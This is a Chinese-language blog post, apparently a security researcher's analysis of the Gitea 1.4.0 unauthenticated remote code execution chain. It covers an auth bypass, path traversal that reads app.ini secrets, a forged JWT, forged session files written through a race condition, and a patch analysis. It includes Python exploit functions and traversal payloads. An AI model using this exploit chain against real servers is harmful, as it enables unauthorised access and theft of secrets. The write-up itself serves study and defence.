@@ -1,0 +1,714 @@
+<!DOCTYPE html>
+<html lang="zh_cn">
+
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="chrome=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
+<meta name="description" content="一个孤独散步者的梦">
+
+
+<meta property="twitter:title" content="Gitea 1.4.0未授权远程代码执行漏洞分析">
+
+    <meta property="twitter:card" content="summary">
+
+<meta property="twitter:description" content="">
+
+<title>
+
+
+     诗与胡说 - Gitea 1.4.0未授权远程代码执行漏洞分析 
+
+</title>
+<link rel="canonical" href="https://kylingit.com/blog/gitea-1.4.0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+
+
+<link rel="stylesheet" href="https://kylingit.com/css/main.v0.9.1.css">
+<link rel="stylesheet" href="https://kylingit.com/css/ionicons.min.css">
+
+
+  <link rel="stylesheet" href="https://kylingit.com/css/highlight.min.css">
+
+
+
+  <link rel="stylesheet" href="https://kylingit.com/css/progressively.min.css">
+
+
+
+
+
+<link rel="shortcut icon"
+
+    href="https://kylingit.com/img/favicon.png"
+
+>
+
+
+
+
+</head>
+
+
+<body>
+
+
+<section class="header">
+
+    <div class="container">
+        <a href="https://kylingit.com/"><img class="logo" src="https://kylingit.com/img/logo.jpg" alt="logo" /></a>
+        <div class="content">
+            <a href="https://kylingit.com/"><div class="name"><h1>诗与胡说</h1></div></a>
+            <nav>
+                <ul>
+                    
+                        <a href="https://kylingit.com/blog/"><li>Blog</li></a>
+                    
+                    
+                        
+                    
+                        
+                            
+                            <a href="https://kylingit.com/about"><li>about</li></a>
+                            
+                        
+                    
+                        
+                            
+                        
+                    
+                        
+                            
+                            <a href="https://kylingit.com/projects"><li>projects</li></a>
+                            
+                        
+                    
+                    
+                        
+                            <a href="https://kylingit.com/notes/"><li>notes</li></a>
+                        
+                    
+                        
+                    
+                </ul>
+            </nav>
+        </div>
+    </div>
+</section>
+
+
+<section class="main post non-narrow zero-top-spacing">
+    <div class="container">
+        <div class="content">
+            <div class="front-matter">
+                <div class="title-container">
+                    <div class="page-heading">
+
+    Gitea 1.4.0未授权远程代码执行漏洞分析
+
+</div>
+
+                </div>
+                <div class="meta">
+                    <div class="date" title="Tue Jul 17 2018 17:52:10 UTC">Jul 17, 2018</div>
+                    <div class="reading-time"><div class="middot"></div>5 minutes read</div>
+                </div>
+            </div>
+            <div class="markdown">
+                
+    
+    
+
+<script src="https://ob5vt1k7f.qnssl.com/pangu.js"></script>
+
+<h3 id="0x01-环境搭建">0x01 环境搭建</h3>
+
+<p>使用docker搭建漏洞环境，<code>Gitea</code>版本1.4.0</p>
+
+<p><a href="https://docs.gitea.io/en-us/install-with-docker/">https://docs.gitea.io/en-us/install-with-docker/</a></p>
+
+<p>docker-compose.yml</p>
+
+<pre><code>version: &quot;2&quot;
+
+networks:
+  gitea:
+    external: false
+
+services:
+  server:
+    image: gitea/gitea:1.4.0
+    environment:
+      - USER_UID=1000
+      - USER_GID=1000
+    restart: always
+    networks:
+      - gitea
+    volumes:
+      - ./gitea:/data
+    ports:
+      - &quot;3000:3000&quot;
+      - &quot;222:22&quot;
+    depends_on:
+      - db
+
+  db:
+    image: mysql:5.7
+    restart: always
+    environment:
+      - MYSQL_ROOT_PASSWORD=gitea
+      - MYSQL_USER=gitea
+      - MYSQL_PASSWORD=gitea
+      - MYSQL_DATABASE=gitea
+    networks:
+      - gitea
+    volumes:
+      - ./mysql:/var/lib/mysql
+    ports:
+      - &quot;3306:3306&quot;
+</code></pre>
+
+<p>安装时指定<code>mysql</code>连接需要<code>vps_ip:3306</code>，使用<code>localhost:3306</code>一直提示错误</p>
+
+<h3 id="0x02-逻辑漏洞">0x02 逻辑漏洞</h3>
+
+<p><a href="https://github.com/go-gitea/gitea/blob/v1.4.0/modules/lfs/server.go#L218">https://github.com/go-gitea/gitea/blob/v1.4.0/modules/lfs/server.go#L218</a></p>
+
+<pre><code class="language-go">// PostHandler instructs the client how to upload data
+func PostHandler(ctx *context.Context) {
+    //...
+    if !authenticate(ctx, repository, rv.Authorization, true) {
+		requireAuth(ctx)
+	}
+	//...
+}
+func requireAuth(ctx *context.Context) {
+	ctx.Resp.Header().Set(&quot;WWW-Authenticate&quot;, &quot;Basic realm=gitea-lfs&quot;)
+	writeStatus(ctx, 401)
+}
+</code></pre>
+
+<p>问题出在<code>PostHandler()</code>方法，该方法的作用是创建一个新的<code>LFS</code>对象。在<code>requireAuth</code>处，如果权限验证失败，则执行<code>requireAuth ()</code>，返回<code>401认证失败</code>，关键是<code>requireAuth(ctx)</code>结束之后没有<code>return</code>，也就是说虽然返回<code>401</code>但是不影响后面的逻辑接着执行，因此可以创建任意LFS对象，此处存在一个权限绕过漏洞。</p>
+
+<h3 id="0x03-目录穿越-任意文件读取">0x03  目录穿越&amp;任意文件读取</h3>
+
+<p>参考文档 <a href="https://github.com/git-lfs/git-lfs/blob/master/docs/api/batch.md">https://github.com/git-lfs/git-lfs/blob/master/docs/api/batch.md</a></p>
+
+<pre><code class="language-go">// Get takes a Meta object and retrieves the content from the store, returning
+// it as an io.Reader. If fromByte &gt; 0, the reader starts from that byte
+func (s *ContentStore) Get(meta *models.LFSMetaObject, fromByte int64) (io.ReadCloser, error) {
+	path := filepath.Join(s.BasePath, transformKey(meta.Oid))
+
+	f, err := os.Open(path)
+	if err != nil {
+		return nil, err
+	}
+	if fromByte &gt; 0 {
+		_, err = f.Seek(fromByte, os.SEEK_CUR)
+	}
+	return f, err
+}
+</code></pre>
+
+<p>从<code>lfs</code>下载文件接口是<code>modules/lfs/content_store.go:Get()</code>方法，从<code>meta.Oid</code>取路径去读取，这个路径处理函数是<code>transformKey()</code></p>
+
+<pre><code class="language-go">func transformKey(key string) string {
+	if len(key) &lt; 5 {
+		return key
+	}
+
+	return filepath.Join(key[0:2], key[2:4], key[4:])
+}
+</code></pre>
+
+<p>可以看到<code>transformKey()</code>方法是把key参数做了三次分割，先取两个字符，加上<code>/</code>，然后再取两个，再加上<code>/</code>，最后拼接后面部分，举例说明：</p>
+
+<p><code>abcdefgh -&gt; ab\cd\efgh</code></p>
+
+<p>于是此处就可以构造<code>..../etc/passwd</code>的格式，经过<code>transformKey()</code>后被转换成<code>../../etc/passwd</code>，这样就存在一个任意文件读取漏洞。</p>
+
+<p>在<code>Gitea</code>中有一个关键配置文件<code>app.ini</code>，其中记录了默认配置信息，包括数据库连接密码，一些路径和<code>token</code>，以及LFS 认证密钥 ，该密钥用来加密JWT认证</p>
+
+<p>配置项更详细信息可以参考<a href="https://docs.gitea.io/zh-cn/config-cheat-sheet/">文档</a></p>
+
+<p>当前环境中<code>app.ini</code>位置在<code>/data/gitea/conf/app.ini</code>，所以需要构造<code>....gitea/conf/app.ini</code>，经过处理变成<code>/data/gitea/lfs/../../gitea/conf/app.ini</code>，也就是<code>/data/gitea/conf/app.ini</code>，这样就能读取到配置文件，注意需要对<code>/</code>进行<code>url</code>编码</p>
+
+<p>访问LFS存储对象的接口是<code>https://git-server.com/foo/bar.git/info/lfs/objects/batch</code></p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/1531882119588.png" alt="1531882119588" /></p>
+
+<p>由此我们获取到了<code>LFS_JWT_SECRET</code></p>
+
+<h3 id="0x04-构造authorization">0x04 构造Authorization</h3>
+
+<p>LFS接口认证过程使用了JWT或Basic认证，<a href="https://jwt.io/introduction/">官网介绍</a>JWT：</p>
+
+<blockquote>
+<p><code>JSON Web Token (JWT)</code> is an open standard (<a href="https://tools.ietf.org/html/rfc7519">RFC 7519</a>) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed. JWTs can be signed using a secret (with the <strong>HMAC</strong> algorithm) or a public/private key pair using <strong>RSA</strong> or <strong>ECDSA</strong>.</p>
+
+<p>Although JWTs can be encrypted to also provide secrecy between parties, we will focus on <em>signed</em> tokens. Signed tokens can verify the <em>integrity</em> of the claims contained within it, while encrypted tokens <em>hide</em> those claims from other parties. When tokens are signed using public/private key pairs, the signature also certifies that only the party holding the private key is the one that signed it.</p>
+</blockquote>
+
+<p>所以我们一旦获得了<code>LFS_JWT_SECRET</code>，就可以自己构造JWT认证，从而在不知道管理员账户密码的情况下取得LFS的完整控制权。</p>
+
+<p>在<code>modules/lfs/server.go</code>定义了LFS接口认证登录的方法：</p>
+
+<pre><code class="language-go">func parseToken(authorization string) (*models.User, *models.Repository, string, error) {
+	if authorization == &quot;&quot; {
+		return nil, nil, &quot;unknown&quot;, fmt.Errorf(&quot;No token&quot;)
+	}
+	if strings.HasPrefix(authorization, &quot;Bearer &quot;) {
+		token, err := jwt.Parse(authorization[7:], func(t *jwt.Token) (interface{}, error) {
+			if _, ok := t.Method.(*jwt.SigningMethodHMAC); !ok {
+				return nil, fmt.Errorf(&quot;unexpected signing method: %v&quot;, t.Header[&quot;alg&quot;])
+			}
+			return setting.LFS.JWTSecretBytes, nil
+		})
+		if err != nil {
+			return nil, nil, &quot;unknown&quot;, err
+		}
+		claims, claimsOk := token.Claims.(jwt.MapClaims)
+		if !token.Valid || !claimsOk {
+			return nil, nil, &quot;unknown&quot;, fmt.Errorf(&quot;Token claim invalid&quot;)
+		}
+		opStr, ok := claims[&quot;op&quot;].(string)
+		if !ok {
+			return nil, nil, &quot;unknown&quot;, fmt.Errorf(&quot;Token operation invalid&quot;)
+		}
+		repoID, ok := claims[&quot;repo&quot;].(float64)
+		if !ok {
+			return nil, nil, opStr, fmt.Errorf(&quot;Token repository id invalid&quot;)
+		}
+		r, err := models.GetRepositoryByID(int64(repoID))
+		if err != nil {
+			return nil, nil, opStr, err
+		}
+		userID, ok := claims[&quot;user&quot;].(float64)
+		if !ok {
+			return nil, r, opStr, fmt.Errorf(&quot;Token user id invalid&quot;)
+		}
+		u, err := models.GetUserByID(int64(userID))
+		if err != nil {
+			return nil, r, opStr, err
+		}
+		return u, r, opStr, nil
+	}
+    if strings.HasPrefix(authorization, &quot;Basic &quot;) {
+        //...
+    }
+    return nil, nil, &quot;unknown&quot;, fmt.Errorf(&quot;Token not found&quot;)
+}
+</code></pre>
+
+<p>可以看到构成JWT的<code>payload</code>部分需要包含这么几个字段：</p>
+
+<pre><code class="language-json">{
+  &quot;user&quot;: 1,
+  &quot;repo&quot;: 1,
+  &quot;op&quot;: &quot;upload&quot;,
+  &quot;nbf&quot;: 1445408221,
+  &quot;exp&quot;: 1618208221
+}
+</code></pre>
+
+<p>分别是用户id，LFS项目id，LFS操作，以及<code>HTTPAuth</code>有效时间</p>
+
+<p>我们在<a href="https://jwt.io/#debugger">JWT debugger页面</a>测试生成一段<code>Auth Token</code>，填入<code>payload</code>和上一步获取到的<code>LFS_JWT_SECRET</code>，于是得到了LFS认证的<code>Authorization</code></p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/1531883703859.png" alt="1531883703859" /></p>
+
+<h3 id="0x05-伪造session绕过登录">0x05 伪造session绕过登录</h3>
+
+<p>在<code>modules/lfs/server.go</code> 定义了LFS中的路由接口</p>
+
+<pre><code class="language-go">// ObjectOidHandler is the main request routing entry point into LFS server functions
+func ObjectOidHandler(ctx *context.Context) {
+	if !setting.LFS.StartServer {
+		writeStatus(ctx, 404)
+		return
+	}
+	if ctx.Req.Method == &quot;GET&quot; || ctx.Req.Method == &quot;HEAD&quot; {
+		if MetaMatcher(ctx.Req) {
+			getMetaHandler(ctx)
+			return
+		}
+		if ContentMatcher(ctx.Req) || len(ctx.Params(&quot;filename&quot;)) &gt; 0 {
+			getContentHandler(ctx)
+			return
+		}
+	} else if ctx.Req.Method == &quot;PUT&quot; &amp;&amp; ContentMatcher(ctx.Req) {
+		PutHandler(ctx)
+		return
+	}
+}
+</code></pre>
+
+<p>其中写入文件接口是在<code>PutHandler()</code>，需要使用<code>PUT</code>方法。跟入<code>Put()</code>看一下</p>
+
+<pre><code class="language-go">// Put takes a Meta object and an io.Reader and writes the content to the store.
+func (s *ContentStore) Put(meta *models.LFSMetaObject, r io.Reader) error {
+	path := filepath.Join(s.BasePath, transformKey(meta.Oid))
+	tmpPath := path + &quot;.tmp&quot;
+
+	dir := filepath.Dir(path)
+	if err := os.MkdirAll(dir, 0750); err != nil {
+		return err
+	}
+
+	file, err := os.OpenFile(tmpPath, os.O_CREATE|os.O_WRONLY|os.O_EXCL, 0640)
+	if err != nil {
+		return err
+	}
+	defer os.Remove(tmpPath)
+
+	hash := sha256.New()
+	hw := io.MultiWriter(hash, file)
+
+	written, err := io.Copy(hw, r)
+	if err != nil {
+		file.Close()
+		return err
+	}
+	file.Close()
+
+	if written != meta.Size {
+		return errSizeMismatch
+	}
+
+	shaStr := hex.EncodeToString(hash.Sum(nil))
+	if shaStr != meta.Oid {
+		return errHashMismatch
+	}
+
+	return os.Rename(tmpPath, path)
+}
+</code></pre>
+
+<p>可以看到该方法主要是先创建临时文件，以<code>.tmp</code>结尾，然后对文件进行了一系列校验，包括文件大小和<code>Oid</code>信息，两者如果任一不匹配的话就写入失败，同时删除临时文件。注意这行语句</p>
+
+<p><code>defer os.Remove(tmpPath)</code></p>
+
+<blockquote>
+<p><code>defer</code>用于资源的释放，会在函数返回之前进行调用。</p>
+</blockquote>
+
+<p>也就是说不管函数是否返回错误，结束时都会删除临时文件。</p>
+
+<p>这时就要考虑两点：</p>
+
+<ol>
+<li>在文件被删除之前利用；</li>
+<li>如何利用后缀为.tmp的文件；</li>
+</ol>
+
+<p>先考虑第一个问题，在文件被删除之前访问到这个文件。这种情况让我们想到在上传webshell时可以利用的条件竞争漏洞，在文件被删除之前使用多线程并发访问，利用时间差访问到上传文件然后生成shell。但是这个方法在此处不适用，根据作者想出的办法，利用<code>Content-Length</code>字段，该字段告诉服务器该请求需要发送多少长度的数据， 在传输完成之前服务器会处于一直等待阶段。假设我们设置了一个超长的<code>Content-Length</code>，服务器就会认为数据还没有传输完成便挂起等待，这个时间段内我们就可以访问到上传的文件。</p>
+
+<p>接着考虑第二个问题，如何利用<code>.tmp</code>文件？</p>
+
+<p>在<code>Gitea</code>可以配置存储session的方式，默认是保存为文件，存储路径在<code>/data/gitea/sessions</code>。于是我们可以想到把上面生成的session内容写入到一个<code>.tmp</code>文件，并保存在session目录下，这个tmp文件名即为<code>sessionid</code>，然后利用条件竞争，在文件未被删除之前带上这个<code>sessionid</code>，就可以登录成功。</p>
+
+<p><code>Gitea</code>使用的session模块是<a href="https://github.com/go-macaron/session">go-macaron/session</a>，在<code>file.go</code>可以看到几个关键的方法</p>
+
+<pre><code class="language-go">// Release releases resource and save data to provider.
+func (s *FileStore) Release() error {
+	s.p.lock.Lock()
+	defer s.p.lock.Unlock()
+
+	data, err := EncodeGob(s.data)
+	if err != nil {
+		return err
+	}
+
+	return ioutil.WriteFile(s.p.filepath(s.sid), data, os.ModePerm)
+}
+</code></pre>
+
+<p>调用了<code>EncodeGob()</code>方法</p>
+
+<pre><code class="language-go">func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {
+	for _, v := range obj {
+		gob.Register(v)
+	}
+	buf := bytes.NewBuffer(nil)
+	err := gob.NewEncoder(buf).Encode(obj)
+	return buf.Bytes(), err
+}
+</code></pre>
+
+<p>然后写入文件</p>
+
+<pre><code class="language-go">func (p *FileProvider) filepath(sid string) string {
+	return path.Join(p.rootPath, string(sid[0]), string(sid[1]), sid)
+}
+</code></pre>
+
+<p>可以看到session的生成是通过特有的Gob序列化后保存成文件，路径特点是<code>sid[0]/sid[1]/sid</code></p>
+
+<p>我们来分析一个认证成功的session<code>/data/gitea/sessions/0/9/09cfb25c946d6187</code>，前两位为路径名，后面为sid，共同组成一个session文件</p>
+
+<p>我们使用相应的<code>DecodeGob()</code>方法来解开看一下session里包含的内容，其中<code>session_data</code>即是文件的hex内容。代码如下</p>
+
+<pre><code class="language-go">package main
+
+import (
+	&quot;encoding/gob&quot;
+	&quot;encoding/hex&quot;
+	&quot;fmt&quot;
+	&quot;bytes&quot;
+)
+
+func DecodeGob(encoded []byte) (out map[interface{}]interface{}, err error) {
+	buf := bytes.NewBuffer(encoded)
+	err = gob.NewDecoder(buf).Decode(&amp;out)
+	return out, err
+}
+
+func main() {
+	session_data := &quot;0EFF81040102...03000131&quot;	//太长省略
+	buf, err := hex.DecodeString(session_data)
+	fmt.Println(buf)
+	if err != nil {
+		fmt.Println(err)
+	}
+	decode_data, err := DecodeGob(buf)
+	if err != nil {
+		fmt.Println(err)
+	}
+	fmt.Println(decode_data)
+}
+</code></pre>
+
+<p>运行结果：</p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/1531898336305.png" alt="1531898336305" /></p>
+
+<p>可以看到主要是以<code>_old_iod</code> <code>uid</code> <code>uname</code>三个值组成的session内容，那么我们就可以构造一组这样的值来伪造一个session</p>
+
+<p>生成session使用<code>EncodeGob()</code>方法：</p>
+
+<pre><code class="language-go">package main
+
+import (
+	&quot;encoding/gob&quot;
+	&quot;encoding/hex&quot;
+	&quot;fmt&quot;
+	&quot;bytes&quot;
+)
+
+func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {
+	for _, v := range obj {
+		gob.Register(v)
+	}
+	buf := bytes.NewBuffer(nil)
+	err := gob.NewEncoder(buf).Encode(obj)
+	return buf.Bytes(), err
+}
+
+func main() {
+	//var uid = 1
+	//uname := &quot;admin123&quot;
+	obj := map[interface{}]interface{}{&quot;_old_iod&quot;: &quot;1&quot;, &quot;uid&quot;: 1, &quot;uname&quot;: &quot;admin123&quot;}
+	buf, err := EncodeGob(obj)
+	if err != nil {
+		fmt.Println(err)
+	}
+	fmt.Println(buf)
+	encode_data := hex.EncodeToString(buf)
+	fmt.Println(encode_data)
+}
+</code></pre>
+
+<p>运行之后生成一个hex序列</p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/1531898708274.png" alt="1531898708274" /></p>
+
+<p>这段序列里就包含了session信息，包括 <code>_old_iod</code> <code>uid</code> <code>uname</code>，然后我们可以利用这个伪造的<code>session</code>成功登录</p>
+
+<h3 id="0x06-漏洞利用">0x06 漏洞利用</h3>
+
+<h5 id="1-读取-app-ini-获得-lfs-jwt-secret">1. 读取<code>app.ini</code>，获得<code>LFS_JWT_SECRET</code></h5>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/1531882119588.png" alt="1531882119588" /></p>
+
+<h5 id="2-针对-session-文件名创建-lfs-对象">2. 针对<code>session</code>文件名创建<code>LFS</code>对象</h5>
+
+<pre><code class="language-python">def create_lfs_object(session):
+    oid = '....gitea/sessions/1/1/11session'
+    data = {
+        &quot;Oid&quot;: oid,
+        &quot;Size&quot;: 1000,
+        &quot;User&quot;: &quot;a&quot;,
+        &quot;Password&quot;: &quot;a&quot;,
+        &quot;Repo&quot;: &quot;a&quot;,
+        &quot;Authorization&quot;: &quot;a&quot;
+    }
+
+    url = '%s.git/info/lfs/objects' % (GIT_URL)
+    response = s.post(
+        url,
+        json=data,
+        headers={
+            'Accept': 'application/vnd.git-lfs+json'
+        }
+    )
+    logging.info(response.text)
+</code></pre>
+
+<h5 id="3-生成-authorization">3. 生成<code>Authorization</code></h5>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/1531883703859.png" alt="1531883703859" /></p>
+
+<h5 id="4-生成-session-数据">4. 生成<code>session</code>数据</h5>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/1531898708274.png" alt="1531898708274" /></p>
+
+<h5 id="5-写入-session-数据">5. 写入<code>session</code>数据</h5>
+
+<pre><code class="language-python">def write_session(session):
+    oid = '....gitea/sessions/1/1/11session'
+    url = '%s.git/info/lfs/objects/%s' % (GIT_URL, urllib.quote(oid, safe=''))
+    print url
+    response = s.put(url, data=gen_data(), headers={
+        'Accept': 'application/vnd.git-lfs',
+        'Content-Type': 'application/vnd.git-lfs',
+        'Authorization': 'Bearer ' + AUTH_TOKEN
+    })
+    logging.info(response.text)
+</code></pre>
+
+<p>其中<code>gen_data()</code>使用生成器来延迟响应时间，在这段时间内<code>.tmp</code>文件未被删除</p>
+
+<pre><code class="language-python">def gen_data():
+    yield SESSION_DATA
+    time.sleep(300)
+</code></pre>
+
+<h5 id="6-修改cookie">6. 修改cookie</h5>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/1531905605099.png" alt="1531905605099" /></p>
+
+<p>后续利用<code>Git Hooks</code>自动执行命令就不多说了</p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/1531905731043.png" alt="1531905731043" /></p>
+
+<h3 id="0x07-补丁分析">0x07 补丁分析</h3>
+
+<p><a href="https://github.com/go-gitea/gitea/pull/3871/commits/61d86164b7a81cf478b28ed3ffd9aa83d33116d9">https://github.com/go-gitea/gitea/pull/3871/commits/61d86164b7a81cf478b28ed3ffd9aa83d33116d9</a></p>
+
+<p>分析补丁主要做了三块工作：</p>
+
+<ol>
+<li>首先把缺少的<code>return</code>给补上了</li>
+<li>限定了<code>oid</code>参数值必须符合<code>sha256</code>格式，如果查询的<code>oid</code>不存在则返回404，这样我们就无法指定任意<code>oid</code>值</li>
+</ol>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/1531798747694.png" alt="1531798747694" /></p>
+
+<ol>
+<li>然后使用<code>path.Clean()</code>方法过滤多余的<code>.</code>和<code>/</code>，限制<code>repo</code>里不能出现<code>.</code>和<code>/</code>字符</li>
+</ol>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/1531804973465.png" alt="1531804973465" /></p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/1531804989614.png" alt="1531804989614" /></p>
+
+<h3 id="0x08-总结">0x08 总结</h3>
+
+<p>该漏洞利用非常巧妙，由一处缺少的<code>return</code>层层深入，从权限绕过到文件读取，从伪造session到条件竞争，到最后的远程代码执行，一条漏洞链就串起来了，可谓十分精彩，也从侧面反映了一处小疏忽也会导致严重的后果。</p>
+
+<p>参考：</p>
+
+<p><a href="https://security.szurek.pl/gitea-1-4-0-unauthenticated-rce.html">https://security.szurek.pl/gitea-1-4-0-unauthenticated-rce.html</a></p>
+
+<p><a href="https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html">https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html</a></p>
+
+<script>pangu.spacingPage();</script>
+
+
+                <br>
+                <p><a href="https://kylingit.com/blog">Back to posts</a></p>
+            </div>
+            <br>
+            <div class="disqus">
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'kylingit';
+    var disqus_identifier = 'https:\/\/kylingit.com\/blog\/gitea-1.4.0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90\/';
+    var disqus_title = 'Gitea 1.4.0未授权远程代码执行漏洞分析';
+    var disqus_url = 'https:\/\/kylingit.com\/blog\/gitea-1.4.0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90\/';
+
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section class="footer">
+    <div class="container">
+        <div class="copyright">
+
+        
+            <a href="https://kylingit.com/license">Copyright © 2018 kylinking</a>
+        
+
+        </div>
+        <div class="icons">
+
+        
+            <a href="https://github.com/kylingit" target="_blank">
+                <i class="icon ion-social-github" title="github"></i>
+            </a>
+        
+
+        
+
+        
+
+        
+            <a href="mailto:ikylinking@gmail.com">
+                <i class="icon ion-ios-email larger" title="email"></i>
+            </a>
+        
+
+        
+            <a href="https://kylingit.com/index.xml">
+                <i class="icon ion-social-rss larger" title="rss"></i>
+            </a>
+        
+
+        </div>
+    </div>
+</section>
+
+
+  <script src="https://kylingit.com/js/highlight.min.js" defer></script>
+  
+
+
+
+  <script src="https://kylingit.com/js/progressively.min.js" defer></script>
+
+
+<script>
+  window.onload = function() {
+    
+      hljs.initHighlighting();
+    
+    
+      progressively.init({delay: 30, throttle: 50});
+    
+  };
+</script>
+
+</body>
+</html>
+
